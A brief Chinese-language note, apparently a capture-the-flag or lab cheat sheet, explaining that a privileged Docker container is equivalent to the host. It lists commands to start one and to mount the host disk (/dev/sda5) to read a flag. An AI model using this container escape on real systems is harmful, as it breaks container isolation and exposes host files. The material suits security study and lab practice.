使用特权容器可以认为等同于host环境。

# 创建特权容器
```
docker run -it --privileged ubuntu
```

# 挂载目录

```
mkdir /escape
fdisk -l
mount /dev/sda5 /escape
cd /escape
cat flag
```